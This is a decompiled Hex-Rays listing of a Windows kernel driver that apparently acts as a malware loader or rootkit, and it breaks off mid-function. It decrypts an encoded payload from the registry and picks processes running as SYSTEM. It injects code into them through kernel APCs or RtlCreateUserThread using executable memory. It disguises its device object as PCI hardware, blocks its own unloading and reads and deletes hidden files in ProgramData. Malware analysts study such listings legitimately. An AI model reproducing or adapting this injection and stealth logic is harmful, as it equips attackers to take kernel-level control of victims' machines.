// Decompiled by IDA Pro Hex-Rays

// Function: sub_140001000 at 0x140001000
void __fastcall sub_140001000(void *a1)
{
  __int64 v2; // rcx

  nullsub_1("ApcpKernelRoutineAlertThreadCallback");
  LOBYTE(v2) = 1;
  KeTestAlertThread(v2);
  ExFreePoolWithTag(a1, 0x5F435041u);
}


// Function: sub_140001034 at 0x140001034
void __fastcall sub_140001034(void *a1, PVOID *a2, PVOID *a3)
{
  nullsub_1("ApcpKernelRoutineInjectCallback");
  if ( PsIsThreadTerminating(KeGetCurrentThread()) )
    *a2 = 0LL;
  if ( PsGetCurrentProcessWow64Process() )
    PsWrapApcWow64Thread(a3, a2);
  ExFreePoolWithTag(a1, 0x5F435041u);
}


// Function: sub_1400010A4 at 0x1400010A4
__int64 __fastcall sub_1400010A4(PEPROCESS Process, PETHREAD *Thread)
{
  HANDLE ProcessId; // rbp
  __int64 result; // rax
  HANDLE *v6; // rbx
  __int64 ProcessWow64Process; // rax
  NTSTATUS v8; // esi
  bool v9; // r15
  __int64 i; // rbp
  HANDLE v11; // r14
  __int64 v12; // rdx

  if ( !Thread || !Process )
    return 3221225485LL;
  nullsub_1("LookupProcessThread start");
  ProcessId = PsGetProcessId(Process);
  result = sub_140004304(SystemProcessInformation);
  if ( (int)result >= 0 )
  {
    v6 = 0LL;
    while ( v6[10] != ProcessId )
    {
      v6 = (HANDLE *)((char *)v6 + *(unsigned int *)v6);
      if ( !*(_DWORD *)v6 )
        return result;
    }
    ProcessWow64Process = PsGetProcessWow64Process(Process);
    v8 = -1073741275;
    v9 = ProcessWow64Process != 0;
    for ( i = 0LL; (unsigned int)i < *((_DWORD *)v6 + 1); i = (unsigned int)(i + 1) )
    {
      v11 = v6[10 * i + 38];
      if ( v11 != PsGetCurrentThreadId() )
      {
        v8 = PsLookupThreadByThreadId(v11, Thread);
        if ( v8 >= 0 )
        {
          if ( !*Thread )
            break;
          LOBYTE(v12) = v9;
          if ( !(unsigned __int8)sub_140001374(*Thread, v12) )
            break;
          ObfDereferenceObject(*Thread);
          *Thread = 0LL;
        }
      }
    }
    if ( !*Thread )
      v8 = -1073741275;
    nullsub_1("LookupProcessThread");
    return (unsigned int)v8;
  }
  return result;
}


// Function: sub_1400011EC at 0x1400011EC
__int64 __fastcall sub_1400011EC(PETHREAD Thread, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  unsigned int v9; // ebx
  PVOID PoolWithTag; // rdi
  PVOID v12; // rax
  void *v13; // rbp
  int v14; // [rsp+30h] [rbp-28h]

  v9 = -1073741823;
  if ( !Thread )
    return 3221225485LL;
  nullsub_1("QueueUserApc start");
  PoolWithTag = ExAllocatePoolWithTag(NonPagedPool, 0x58uLL, 0x5F435041u);
  v12 = ExAllocatePoolWithTag(NonPagedPool, 0x58uLL, 0x5F435041u);
  v13 = v12;
  if ( v12 && PoolWithTag )
  {
    KeInitializeApc(v12, Thread, 0LL, sub_140001034, 0LL, a2, 1, a3);
    LOBYTE(v14) = 0;
    KeInitializeApc(PoolWithTag, Thread, 0LL, sub_140001000, 0LL, 0LL, v14, 0LL);
    if ( (unsigned __int8)KeInsertQueueApc(v13, a4, a5, 0LL) )
    {
      if ( (unsigned __int8)KeInsertQueueApc(PoolWithTag, 0LL, 0LL, 0LL) )
      {
        nullsub_1("KeInsertQueueApc2");
        v9 = PsIsThreadTerminating(Thread) != 0 ? 0xC000004B : 0;
LABEL_11:
        nullsub_1("QueueUserApc end");
        return v9;
      }
    }
    else
    {
      ExFreePoolWithTag(v13, 0x5F435041u);
    }
    ExFreePoolWithTag(PoolWithTag, 0x5F435041u);
    goto LABEL_11;
  }
  return 3221225495LL;
}


// Function: sub_140001374 at 0x140001374
bool __fastcall sub_140001374(__int64 a1, char a2)
{
  __int64 ThreadTeb; // rax

  ThreadTeb = PsGetThreadTeb();
  if ( ThreadTeb && !*(_QWORD *)(ThreadTeb + 120) )
  {
    if ( a2 )
    {
      if ( *(_DWORD *)(ThreadTeb + 8616) && *(_DWORD *)(ThreadTeb + 8236) )
        return 0;
    }
    else if ( *(_QWORD *)(ThreadTeb + 712) )
    {
      return *(_QWORD *)(ThreadTeb + 88) == 0LL;
    }
  }
  return 1;
}


// Function: sub_1400013C4 at 0x1400013C4
void sub_1400013C4()
{
  KeInitializeMutex(&stru_14000A3C0, 0);
}


// Function: nullsub_1 at 0x1400013D4
void nullsub_1()
{
  ;
}


// Function: sub_1400013D8 at 0x1400013D8
__int64 __fastcall sub_1400013D8(__int64 a1, struct _KPROCESS *a2)
{
  __int64 ProcessWow64Process; // rsi
  PEPROCESS CurrentProcess; // rax
  unsigned int v7; // ebx
  void *v8; // rax
  unsigned int v9; // eax
  PVOID BaseAddress; // [rsp+20h] [rbp-58h] BYREF
  ULONG_PTR RegionSize; // [rsp+28h] [rbp-50h] BYREF
  _KAPC_STATE ApcState; // [rsp+30h] [rbp-48h] BYREF

  ProcessWow64Process = PsGetProcessWow64Process(a2);
  CurrentProcess = IoGetCurrentProcess();
  if ( (unsigned __int8)sub_140003DBC(CurrentProcess) )
    return 3221225738LL;
  KeStackAttachProcess(a2, &ApcState);
  if ( ProcessWow64Process )
  {
    BaseAddress = 0LL;
  }
  else
  {
    v8 = (void *)sub_140001620(a1);
    BaseAddress = v8;
    if ( v8 )
    {
      if ( *(_DWORD *)(a1 + 128) )
        v9 = sub_140001978(v8);
      else
        v9 = sub_1400014BC(v8, a2);
      RegionSize = 0LL;
      v7 = v9;
      ZwFreeVirtualMemory((HANDLE)0xFFFFFFFFFFFFFFFFLL, &BaseAddress, &RegionSize, 0x8000u);
      goto LABEL_6;
    }
  }
  v7 = -1073741801;
LABEL_6:
  KeUnstackDetachProcess(&ApcState);
  return v7;
}


// Function: sub_1400014BC at 0x1400014BC
__int64 __fastcall sub_1400014BC(__int64 a1, struct _KPROCESS *a2)
{
  signed int v4; // ebx
  int v5; // esi
  PEPROCESS CurrentProcess; // rax
  PETHREAD Thread; // [rsp+50h] [rbp+18h] BYREF
  _LARGE_INTEGER Interval; // [rsp+58h] [rbp+20h] BYREF

  Thread = 0LL;
  nullsub_1();
  v4 = sub_1400010A4(a2, &Thread);
  if ( v4 >= 0 )
  {
    v4 = sub_1400011EC(Thread, a1 + 24, 0LL, 0LL, 0LL);
    if ( v4 >= 0 )
    {
      Interval.QuadPart = -50000LL;
      v5 = 0;
      while ( 1 )
      {
        CurrentProcess = IoGetCurrentProcess();
        if ( (unsigned __int8)sub_140003DBC(CurrentProcess) || PsIsThreadTerminating(Thread) )
          break;
        if ( *(_DWORD *)(a1 + 8) != 1216605224 )
        {
          v4 = KeDelayExecutionThread(0, 0, &Interval);
          if ( v4 < 0 )
            goto LABEL_11;
          if ( (unsigned int)++v5 < 0x2710 )
            continue;
        }
        v4 = *(_DWORD *)(a1 + 12) == 0 ? 0xC0000135 : 0;
        goto LABEL_11;
      }
      v4 = -1073741558;
LABEL_11:
      nullsub_1();
      nullsub_1();
    }
    if ( Thread )
      ObfDereferenceObject(Thread);
  }
  nullsub_1();
  return (unsigned int)v4;
}


// Function: StartRoutine at 0x1400015D8
void __fastcall StartRoutine(const WCHAR *StartContext)
{
  NTSTATUS v2; // ebx

  sub_140003DF4(60000LL);
  nullsub_1();
  v2 = sub_14000173C(StartContext);
  sub_140001DD4(StartContext);
  PsTerminateSystemThread(v2);
}


// Function: sub_140001620 at 0x140001620
char *__fastcall sub_140001620(__int64 a1)
{
  __int64 v1; // rax
  char *v4; // [rsp+40h] [rbp+8h] BYREF
  ULONG_PTR v5; // [rsp+48h] [rbp+10h] BYREF

  v1 = *(unsigned int *)(a1 + 140);
  v4 = 0LL;
  v5 = v1 + 24;
  if ( ZwAllocateVirtualMemory((HANDLE)0xFFFFFFFFFFFFFFFFLL, (PVOID *)&v4, 0LL, &v5, 0x1000u, 0x40u) < 0 )
    return 0LL;
  sub_140007A80(v4 + 24, a1 + 144, *(unsigned int *)(a1 + 140));
  *(_QWORD *)(v4 + 26) = v4;
  *((_DWORD *)v4 + 5) = *(_DWORD *)(a1 + 132);
  return v4;
}


// Function: sub_1400016AC at 0x1400016AC
__int64 __fastcall sub_1400016AC(__int64 a1, __int64 a2)
{
  NTSTATUS v2; // ebx
  void *ThreadHandle; // [rsp+40h] [rbp-18h] BYREF
  int v5; // [rsp+70h] [rbp+18h] BYREF
  PVOID StartContext; // [rsp+78h] [rbp+20h] BYREF

  StartContext = 0LL;
  v5 = 0;
  v2 = sub_140001AE8(a2, L"Parameters1", &StartContext, &v5);
  if ( v2 >= 0 )
  {
    ThreadHandle = 0LL;
    v2 = PsCreateSystemThread(&ThreadHandle, 0x1FFFFFu, 0LL, 0LL, 0LL, (PKSTART_ROUTINE)StartRoutine, StartContext);
    if ( ThreadHandle )
      ZwClose(ThreadHandle);
  }
  else
  {
    nullsub_1();
  }
  return (unsigned int)v2;
}


// Function: sub_14000173C at 0x14000173C
__int64 __fastcall sub_14000173C(PCWSTR SourceString)
{
  __int64 result; // rax
  int SecurityUserInfo; // edi
  WCHAR *PoolWithTag; // r15
  unsigned int *v5; // rbx
  PACCESS_TOKEN v6; // rsi
  PSecurityUserData UserInformation[2]; // [rsp+38h] [rbp-48h] BYREF
  _LUID AuthenticationId; // [rsp+48h] [rbp-38h] BYREF
  struct _UNICODE_STRING NameBuffer; // [rsp+50h] [rbp-30h] BYREF
  _UNICODE_STRING DestinationString; // [rsp+60h] [rbp-20h] BYREF
  UNICODE_STRING String2; // [rsp+70h] [rbp-10h] BYREF
  ULONG NameSize; // [rsp+C0h] [rbp+40h] BYREF
  enum _SID_NAME_USE NameUse; // [rsp+C8h] [rbp+48h] BYREF
  ULONG DomainSize; // [rsp+D0h] [rbp+50h] BYREF
  PEPROCESS Process; // [rsp+D8h] [rbp+58h] BYREF

  UserInformation[1] = 0LL;
  if ( !SourceString )
    return 3221225485LL;
  result = sub_140004304(SystemProcessInformation);
  SecurityUserInfo = result;
  if ( (int)result >= 0 )
  {
    RtlInitUnicodeString(&DestinationString, SourceString);
    Process = 0LL;
    NameSize = 128;
    UserInformation[0] = 0LL;
    PoolWithTag = (WCHAR *)ExAllocatePoolWithTag(NonPagedPool, 0x80uLL, 0x4C435041u);
    if ( !PoolWithTag )
      return 3221225495LL;
    v5 = 0LL;
    *(_QWORD *)&NameBuffer.Length = 0LL;
    NameBuffer.MaximumLength = NameSize;
    NameBuffer.Buffer = PoolWithTag;
    if ( !MEMORY[0] )
      goto LABEL_22;
    while ( 1 )
    {
      if ( !*((_WORD *)v5 + 28) )
        goto LABEL_19;
      if ( RtlCompareUnicodeString((PCUNICODE_STRING)(v5 + 14), &DestinationString, 1u) )
        goto LABEL_19;
      SecurityUserInfo = PsLookupProcessByProcessId(*((HANDLE *)v5 + 10), &Process);
      if ( SecurityUserInfo < 0 )
        goto LABEL_19;
      v6 = PsReferencePrimaryToken(Process);
      SecurityUserInfo = SeQueryAuthenticationIdToken(v6, &AuthenticationId);
      if ( SecurityUserInfo < 0 )
        goto LABEL_11;
      SecurityUserInfo = GetSecurityUserInfo(&AuthenticationId, 1u, UserInformation);
      if ( SecurityUserInfo < 0 )
        goto LABEL_13;
      RtlInitUnicodeString(&String2, L"SYSTEM");
      NameUse = 0;
      DomainSize = 0;
      SecurityUserInfo = SecLookupAccountSid(
                           UserInformation[0]->pSid,
                           &NameSize,
                           &NameBuffer,
                           &DomainSize,
                           0LL,
                           &NameUse);
      if ( SecurityUserInfo < 0 )
        break;
      if ( !RtlCompareUnicodeString(&NameBuffer, &String2, 1u) )
      {
        nullsub_1();
        SecurityUserInfo = sub_1400013D8((__int64)SourceString, Process);
        if ( (int)(SecurityUserInfo + 0x80000000) < 0 || SecurityUserInfo == -1073741515 )
        {
          LsaFreeReturnBuffer(UserInformation[0]);
          PsDereferencePrimaryToken(v6);
          ObfDereferenceObject(Process);
LABEL_22:
          ExFreePoolWithTag(PoolWithTag, 0x4C435041u);
          return (unsigned int)SecurityUserInfo;
        }
      }
LABEL_19:
      v5 = (unsigned int *)((char *)v5 + *v5);
      if ( !*v5 )
        goto LABEL_22;
    }
    LsaFreeReturnBuffer(UserInformation[0]);
LABEL_13:
    PsDereferencePrimaryToken(v6);
LABEL_11:
    ObfDereferenceObject(Process);
    goto LABEL_19;
  }
  return result;
}


// Function: sub_140001978 at 0x140001978
__int64 __fastcall sub_140001978(__int64 a1)
{
  NTSTATUS v2; // ebx
  PVOID SystemRoutineAddress; // r10
  PEPROCESS CurrentProcess; // rax
  NTSTATUS v5; // eax
  struct _UNICODE_STRING DestinationString; // [rsp+50h] [rbp-10h] BYREF
  PVOID Object; // [rsp+88h] [rbp+28h] BYREF
  HANDLE Handle; // [rsp+90h] [rbp+30h] BYREF
  union _LARGE_INTEGER Timeout; // [rsp+98h] [rbp+38h] BYREF

  Handle = 0LL;
  Object = 0LL;
  v2 = -1073741823;
  RtlInitUnicodeString(&DestinationString, L"RtlCreateUserThread");
  SystemRoutineAddress = MmGetSystemRoutineAddress(&DestinationString);
  if ( SystemRoutineAddress )
  {
    v2 = ((__int64 (__fastcall *)(__int64, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, __int64, _QWORD, HANDLE *, _QWORD))SystemRoutineAddress)(
           -1LL,
           0LL,
           0LL,
           0LL,
           0LL,
           0LL,
           a1 + 24,
           0LL,
           &Handle,
           0LL);
    nullsub_1();
    if ( v2 >= 0 )
    {
      v2 = ObReferenceObjectByHandle(Handle, 0x1FFFFFu, (POBJECT_TYPE)PsThreadType, 0, &Object, 0LL);
      if ( v2 >= 0 )
      {
        Timeout.QuadPart = -50000000LL;
        v2 = KeWaitForSingleObject(Object, Executive, 0, 0, &Timeout);
        if ( v2 >= 0 )
        {
          CurrentProcess = IoGetCurrentProcess();
          if ( (unsigned __int8)sub_140003DBC(CurrentProcess) )
            v2 = -1073741558;
          v5 = v2;
          v2 = 0;
          if ( *(_DWORD *)(a1 + 8) != 1216605224 )
            v2 = v5;
          if ( v2 >= 0 )
            v2 = *(_DWORD *)(a1 + 12) == 0 ? 0xC0000135 : 0;
        }
        nullsub_1();
        nullsub_1();
        ObfDereferenceObject(Object);
      }
      if ( Handle )
        ZwClose(Handle);
    }
  }
  return (unsigned int)v2;
}


// Function: sub_140001AE8 at 0x140001AE8
__int64 __fastcall sub_140001AE8(__int64 a1, const WCHAR *a2, _QWORD *a3, _DWORD *a4)
{
  unsigned int *v7; // rsi
  char *PoolWithTag; // rdi
  NTSTATUS v10; // ebx
  NTSTATUS v11; // eax
  unsigned int *v12; // rax
  __int64 v13; // r14
  PVOID v14; // rax
  _BYTE *v15; // r9
  void *v16; // rbx
  unsigned int v17; // r8d
  char v18; // dl
  ULONG ResultLength; // [rsp+30h] [rbp-D0h] BYREF
  unsigned int v21; // [rsp+34h] [rbp-CCh] BYREF
  void *KeyHandle; // [rsp+38h] [rbp-C8h] BYREF
  struct _UNICODE_STRING ValueName; // [rsp+40h] [rbp-C0h] BYREF
  struct _UNICODE_STRING DestinationString; // [rsp+50h] [rbp-B0h] BYREF
  _OBJECT_ATTRIBUTES ObjectAttributes; // [rsp+60h] [rbp-A0h] BYREF
  WCHAR SourceString[264]; // [rsp+90h] [rbp-70h] BYREF

  v7 = 0LL;
  KeyHandle = 0LL;
  PoolWithTag = 0LL;
  sub_140007D40(SourceString, 0LL, 520LL);
  sub_140001DF0(SourceString, 260LL, L"%wZ\\Parameters", a1);
  RtlInitUnicodeString(&DestinationString, SourceString);
  ObjectAttributes.RootDirectory = 0LL;
  ObjectAttributes.ObjectName = &DestinationString;
  ObjectAttributes.Length = 48;
  ObjectAttributes.Attributes = 576;
  *(_OWORD *)&ObjectAttributes.SecurityDescriptor = 0LL;
  v10 = ZwOpenKey(&KeyHandle, 0xF003Fu, &ObjectAttributes);
  if ( v10 >= 0 )
  {
    RtlInitUnicodeString(&ValueName, a2);
    v11 = ZwQueryValueKey(KeyHandle, &ValueName, KeyValuePartialInformation, 0LL, 0, &ResultLength);
    v10 = v11;
    if ( v11 == -2147483643 || v11 == -1073741789 )
    {
      if ( ResultLength < 0x10 )
      {
        v10 = -1073741820;
        goto LABEL_25;
      }
      PoolWithTag = (char *)ExAllocatePoolWithTag(NonPagedPool, ResultLength, 0x67666E43u);
      if ( !PoolWithTag )
        goto LABEL_7;
      v10 = ZwQueryValueKey(KeyHandle, &ValueName, KeyValuePartialInformation, PoolWithTag, ResultLength, &ResultLength);
      if ( v10 >= 0 )
      {
        if ( *((_DWORD *)PoolWithTag + 1) == 3 && *((_DWORD *)PoolWithTag + 2) )
        {
          v21 = 512;
          v12 = (unsigned int *)ExAllocatePoolWithTag(NonPagedPool, 0x200uLL, 0x67666E43u);
          v7 = v12;
          if ( !v12 )
            goto LABEL_7;
          if ( (unsigned int)sub_140007558(v12, &v21, PoolWithTag + 12, v21) || v21 < 0x14 )
          {
            v10 = -1073741823;
            goto LABEL_25;
          }
          v13 = *v7;
          if ( (_DWORD)v13 != *((_DWORD *)PoolWithTag + 2) - 512 )
          {
            v10 = -1073741575;
            goto LABEL_25;
          }
          v14 = ExAllocatePoolWithTag(NonPagedPool, *v7, 0x67666E43u);
          v16 = v14;
          if ( !v14 )
          {
LABEL_7:
            v10 = -1073741801;
            goto LABEL_25;
          }
          v17 = 0;
          if ( (_DWORD)v13 )
          {
            v15 = v14;
            do
            {
              v18 = v17 + v17 / 0xFF;
              ++v17;
              *v15 = v15[PoolWithTag + 524 - (_BYTE *)v14] ^ *((_BYTE *)v7
                                                             + (((unsigned __int8)v15 - (unsigned __int8)v14) & 0xF)
                                                             + 4) ^ v18;
              ++v15;
            }
            while ( v17 < (unsigned int)v13 );
          }
          if ( (unsigned int)sub_140004538(v14, v13, v7 + 1, v15) )
          {
            ExFreePoolWithTag(v16, 0x67666E43u);
            *a3 = 0LL;
            v10 = -1073741576;
            *a4 = 0;
          }
          else
          {
            *a3 = v16;
            v10 = 0;
            *a4 = v13;
          }
        }
        else
        {
          v10 = -1073741788;
        }
      }
    }
  }
LABEL_25:
  if ( KeyHandle )
    ZwClose(KeyHandle);
  if ( v7 )
    ExFreePoolWithTag(v7, 0x67666E43u);
  if ( PoolWithTag )
    ExFreePoolWithTag(PoolWithTag, 0x67666E43u);
  return (unsigned int)v10;
}


// Function: sub_140001DD4 at 0x140001DD4
void __fastcall sub_140001DD4(void *a1)
{
  if ( a1 )
    ExFreePoolWithTag(a1, 0x67666E43u);
}


// Function: sub_140001DF0 at 0x140001DF0
__int64 sub_140001DF0(wchar_t *a1, __int64 a2, const wchar_t *a3, ...)
{
  unsigned int v4; // edi
  unsigned __int64 v5; // rsi
  int v6; // eax
  va_list Args; // [rsp+68h] [rbp+20h] BYREF

  va_start(Args, a3);
  if ( (unsigned __int64)(a2 - 1) <= 0x7FFFFFFE )
  {
    v5 = a2 - 1;
    v4 = 0;
    v6 = vsnwprintf(a1, a2 - 1, a3, Args);
    if ( v6 < 0 || v6 > v5 )
    {
      v4 = -2147483643;
    }
    else if ( v6 != v5 )
    {
      return v4;
    }
    a1[v5] = 0;
    return v4;
  }
  v4 = -1073741811;
  if ( a2 )
    *a1 = 0;
  return v4;
}


// Function: sub_140001E5C at 0x140001E5C
__int64 __fastcall sub_140001E5C(int *a1, unsigned __int16 a2, __int64 a3)
{
  int v3; // eax
  UNICODE_STRING String2; // [rsp+20h] [rbp-18h] BYREF

  if ( a2 >= 0x808u )
  {
    String2.Buffer = (PWSTR)(a1 + 1);
    String2.MaximumLength = 1024;
    String2.Length = *((_WORD *)a1 + 1026);
    v3 = *a1;
    if ( *a1 == 10000 )
      return sub_14000305C(&String2);
    switch ( v3 )
    {
      case 20000:
        return sub_140003108(&String2);
      case 30000:
        return sub_140006194(&String2, a3);
      case 40000:
        return sub_14000619C(&String2, a3);
    }
  }
  return 3221225485LL;
}


// Function: sub_140001EF0 at 0x140001EF0
NTSTATUS __fastcall sub_140001EF0(struct _DRIVER_OBJECT *a1)
{
  NTSTATUS result; // eax
  NTSTATUS v3; // edi
  struct _UNICODE_STRING DeviceName; // [rsp+40h] [rbp-20h] BYREF
  struct _UNICODE_STRING SymbolicLinkName; // [rsp+50h] [rbp-10h] BYREF
  PDEVICE_OBJECT DeviceObject; // [rsp+78h] [rbp+18h] BYREF

  DeviceObject = 0LL;
  DeviceName.Buffer = L"\\Device\\PCI#VEN_80586&DEV_1KEA2TDPX";
  *(_DWORD *)&DeviceName.Length = 4718662;
  SymbolicLinkName.Buffer = L"\\DosDevices\\PCI#VEN_80586&DEV_1KEA2TDPX";
  *(_DWORD *)&SymbolicLinkName.Length = 5242958;
  result = IoCreateDevice(a1, 0, &DeviceName, 0x22u, 0, 0, &DeviceObject);
  if ( result >= 0 )
  {
    v3 = IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName);
    if ( v3 >= 0 )
    {
      a1->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_140001FD4;
      a1->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_140001FD4;
      a1->MajorFunction[18] = (PDRIVER_DISPATCH)&sub_140001FD4;
      a1->MajorFunction[14] = (PDRIVER_DISPATCH)&sub_140001FF4;
      qword_14000A268 = (__int64)DeviceObject;
      byte_14000A260 = 1;
    }
    else
    {
      IoDeleteDevice(DeviceObject);
    }
    return v3;
  }
  return result;
}


// Function: sub_140001FD4 at 0x140001FD4
__int64 __fastcall sub_140001FD4(__int64 a1, IRP *a2)
{
  a2->IoStatus.Status = 0;
  a2->IoStatus.Information = 0LL;
  IofCompleteRequest(a2, 0);
  return 0LL;
}


// Function: sub_140001FF4 at 0x140001FF4
__int64 __fastcall sub_140001FF4(__int64 a1, IRP *a2)
{
  struct _IO_STACK_LOCATION *CurrentStackLocation; // rax
  __int64 v3; // rdi
  int *p_Type; // r14
  DWORD LowPart; // ecx
  __int64 Options; // rdx
  DWORD v8; // ecx
  DWORD v9; // ecx
  unsigned int v10; // ebx
  int v11; // eax
  __int64 v13; // [rsp+38h] [rbp+10h] BYREF

  CurrentStackLocation = a2->Tail.Overlay.CurrentStackLocation;
  v3 = 0LL;
  p_Type = (int *)&a2->AssociatedIrp.MasterIrp->Type;
  LowPart = CurrentStackLocation->Parameters.Read.ByteOffset.LowPart;
  Options = CurrentStackLocation->Parameters.Create.Options;
  LODWORD(CurrentStackLocation) = CurrentStackLocation->Parameters.Read.Length;
  HIDWORD(v13) = 0;
  if ( (unsigned int)CurrentStackLocation < 8 )
    goto LABEL_5;
  v8 = LowPart - 2236456;
  if ( v8 )
  {
    v9 = v8 - 4;
    if ( v9 )
    {
      if ( v9 != 4 )
      {
LABEL_5:
        v10 = -1073741811;
        goto LABEL_11;
      }
      v11 = sub_1400020A8(p_Type, Options);
    }
    else
    {
      v11 = sub_1400020E8(p_Type, Options);
    }
  }
  else
  {
    v11 = sub_140001E5C(p_Type, Options, (__int64)&v13 + 4);
  }
  v10 = v11;
  if ( v11 >= 0 )
  {
    LODWORD(v13) = v11;
    v3 = 8LL;
    *(_QWORD *)p_Type = v13;
  }
LABEL_11:
  a2->IoStatus.Information = v3;
  a2->IoStatus.Status = v10;
  IofCompleteRequest(a2, 0);
  return v10;
}


// Function: sub_1400020A8 at 0x1400020A8
__int64 __fastcall sub_1400020A8(int *a1, __int16 a2)
{
  int v2; // eax

  if ( a2 == 4 )
  {
    v2 = *a1;
    if ( *a1 == 10002 )
      return sub_140002DD4(qword_14000A3B8);
    switch ( v2 )
    {
      case 20002:
        return sub_140002DD4(qword_14000A3B0);
      case 30002:
        return sub_140002DD4(qword_14000A2E0);
      case 40002:
        return sub_140002DD4(qword_14000A2E8);
    }
  }
  return 3221225485LL;
}


// Function: sub_1400020E8 at 0x1400020E8
__int64 __fastcall sub_1400020E8(int *a1, __int16 a2)
{
  int v2; // eax

  if ( a2 == 8 )
  {
    v2 = *a1;
    if ( *a1 == 10001 )
      return sub_140002E5C(qword_14000A3B8, (unsigned int)a1[1]);
    switch ( v2 )
    {
      case 20001:
        return sub_140002E5C(qword_14000A3B0, (unsigned int)a1[1]);
      case 30001:
        return sub_140002E5C(qword_14000A2E0, (unsigned int)a1[1]);
      case 40001:
        return sub_140002E5C(qword_14000A2E8, (unsigned int)a1[1]);
    }
  }
  return 3221225485LL;
}


// Function: sub_140002134 at 0x140002134
bool sub_140002134()
{
  bool v0; // bl
  __int64 v2; // [rsp+68h] [rbp-A0h] BYREF
  void *FileHandle; // [rsp+70h] [rbp-98h] BYREF
  struct _IO_STATUS_BLOCK FileHandle_8; // [rsp+78h] [rbp-90h] BYREF
  struct _UNICODE_STRING DestinationString; // [rsp+88h] [rbp-80h] BYREF
  struct _OBJECT_ATTRIBUTES ObjectAttributes; // [rsp+98h] [rbp-70h] BYREF
  WCHAR SourceString[32]; // [rsp+C8h] [rbp-40h] BYREF
  _BYTE Buffer[512]; // [rsp+108h] [rbp+0h] BYREF
  _BYTE v9[512]; // [rsp+308h] [rbp+200h] BYREF

  wcscpy(SourceString, L"\\??\\C:\\ProgramData\\cpkub5133");
  *(&ObjectAttributes.Length + 1) = 0;
  *(&ObjectAttributes.Attributes + 1) = 0;
  FileHandle = 0LL;
  FileHandle_8 = 0LL;
  v0 = 0;
  DestinationString = 0LL;
  RtlInitUnicodeString(&DestinationString, SourceString);
  ObjectAttributes.Length = 48;
  ObjectAttributes.RootDirectory = 0LL;
  ObjectAttributes.Attributes = 64;
  ObjectAttributes.ObjectName = &DestinationString;
  *(_OWORD *)&ObjectAttributes.SecurityDescriptor = 0LL;
  if ( ZwCreateFile(&FileHandle, 0x80000000, &ObjectAttributes, &FileHandle_8, 0LL, 0x80u, 1u, 1u, 0x20u, 0LL, 0) >= 0 )
  {
    FileHandle_8 = 0LL;
    sub_140007D40(Buffer, 0LL, 512LL);
    if ( ZwReadFile(FileHandle, 0LL, 0LL, 0LL, &FileHandle_8, Buffer, 0x200u, 0LL, 0LL) >= 0
      && LODWORD(FileHandle_8.Information) == 512 )
    {
      sub_140007D40(v9, 0LL, 512LL);
      LODWORD(v2) = 512;
      if ( !(unsigned int)sub_140007558(v9, &v2, Buffer, 512LL) )
      {
        if ( (_DWORD)v2 )
          v0 = v9[0] == 1;
      }
    }
  }
  if ( FileHandle )
    ZwClose(FileHandle);
  return v0;
}


// Function: sub_14000233C at 0x14000233C
char sub_14000233C()
{
  NTSTATUS v0; // eax
  _BYTE *v1; // rcx
  __int64 v2; // rdx
  unsigned __int16 i; // di
  __int16 v4; // dx
  void *FileHandle; // [rsp+68h] [rbp-A0h] BYREF
  _QWORD v7[3]; // [rsp+70h] [rbp-98h] BYREF
  struct _IO_STATUS_BLOCK IoStatusBlock; // [rsp+88h] [rbp-80h] BYREF
  _BYTE v9[16]; // [rsp+98h] [rbp-70h] BYREF
  struct _UNICODE_STRING DestinationString; // [rsp+A8h] [rbp-60h] BYREF
  struct _OBJECT_ATTRIBUTES ObjectAttributes; // [rsp+B8h] [rbp-50h] BYREF
  WCHAR SourceString[40]; // [rsp+E8h] [rbp-20h] BYREF
  _BYTE Buffer[2]; // [rsp+138h] [rbp+30h] BYREF
  _WORD v14[255]; // [rsp+13Ah] [rbp+32h] BYREF

  wcscpy(SourceString, L"\\??\\C:\\ProgramData\\sJuDr005Km.dat");
  *(&ObjectAttributes.Length + 1) = 0;
  *(&ObjectAttributes.Attributes + 1) = 0;
  FileHandle = 0LL;
  IoStatusBlock = 0LL;
  DestinationString = 0LL;
  RtlInitUnicodeString(&DestinationString, SourceString);
  ObjectAttributes.Length = 48;
  ObjectAttributes.RootDirectory = 0LL;
  ObjectAttributes.Attributes = 576;
  ObjectAttributes.ObjectName = &DestinationString;
  *(_OWORD *)&ObjectAttributes.SecurityDescriptor = 0LL;
  v0 = ZwCreateFile(&FileHandle, 0x80000000, &ObjectAttributes, &IoStatusBlock, 0LL, 0x80u, 5u, 1u, 0x20u, 0LL, 0);
  if ( v0 >= 0 )
  {
    IoStatusBlock = 0LL;
    sub_140007D40(Buffer, 0LL, 512LL);
    v0 = ZwReadFile(FileHandle, 0LL, 0LL, 0LL, &IoStatusBlock, Buffer, 0x200u, 0LL, 0LL);
    if ( v0 >= 0 )
    {
      if ( FileHandle )
        ZwClose(FileHandle);
      if ( ZwDeleteFile(&ObjectAttributes) < 0 )
      {
        *(struct _UNICODE_STRING *)&v7[1] = DestinationString;
        sub_140004110(&v7[1]);
      }
      v0 = LODWORD(IoStatusBlock.Information) - 2;
      if ( LODWORD(IoStatusBlock.Information) != 2 )
      {
        v1 = v14;
        v2 = (unsigned int)v0;
        do
        {
          LOBYTE(v0) = Buffer[(v1 - (_BYTE *)v14) & 1];
          *v1++ ^= v0;
          --v2;
        }
        while ( v2 );
      }
      for ( i = 0; i < v14[0]; ++i )
      {
        v7[1] = 0LL;
        v0 = sub_140004440(&v14[17 * i + 1]);
        v4 = HIBYTE(v14[17 * i + 17]) | (unsigned __int16)(v14[17 * i + 17] << 8);
        LODWORD(v7[1]) = v0;
        WORD2(v7[1]) = v4;
        if ( v0 || v4 )
          LOBYTE(v0) = sub_1400052B4(&v7[1], v9);
      }
    }
  }
  return v0;
}


// Function: sub_1400025B8 at 0x1400025B8
__int64 __fastcall sub_1400025B8(struct _DRIVER_OBJECT *Driver, PCUNICODE_STRING SourceString)
{
  struct _UNICODE_STRING *PoolWithTag; // rax
  void *ThreadHandle; // [rsp+50h] [rbp+8h] BYREF

  sub_140001EF0(Driver);
  sub_1400013C4();
  nullsub_1();
  sub_1400016AC((__int64)Driver, (__int64)SourceString);
  sub_140006328(Driver);
  sub_140003854(Driver);
  sub_140005754(Driver);
  sub_140005B3C(Driver, SourceString);
  Driver->DriverUnload = 0LL;
  ::Driver = Driver;
  PoolWithTag = (struct _UNICODE_STRING *)ExAllocatePoolWithTag(
                                            NonPagedPool,
